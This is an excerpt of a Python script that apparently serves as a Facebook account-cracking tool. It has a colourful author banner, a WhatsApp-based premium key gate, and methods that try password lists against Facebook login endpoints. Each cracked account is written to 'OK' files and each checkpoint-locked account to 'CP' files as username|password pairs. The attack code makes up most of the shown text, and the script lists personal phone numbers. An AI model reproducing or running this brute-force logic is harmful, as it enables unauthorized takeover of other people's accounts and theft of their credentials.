...
def logo():
	print("""%s
           ...
           \033[1;33m ##        #######     ##     ######  ##     ## ######## 
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : Balawal      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : Balawall      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : Balawal Saleem       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : 03154583168    \033[1;93m▇▇
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/Balawal-100/DNC-OK/tree/main').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        os.system('am start https://wa.me/+8801854521971?text=' + tks)
        reg()
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20Balawal-VAI,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/03154583168?text=' + tks)
...
def chigozie():
    ...
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+8801854521971');chigozie()
    try:
        ...
        os.system('xdg-open https://wa.me/+8801854521971')
        bsn_menu()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : Balawal-Saleem");time.sleep (0.03)
    print("             [*]. FACEBOOK   :  NOOB-USE KORI NAA");time.sleep (0.03)
    print("             [*]. GITHUB     : Balawall");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [Balawal] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-Balawal] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('Balawal-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-Saleem] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('Saleem-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f'\r{H} [OK-Balawal] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Saleem-ok.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-Balawal] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Saleem-cp.txt' , 'a').write('%s\n' % wrt)
                        break
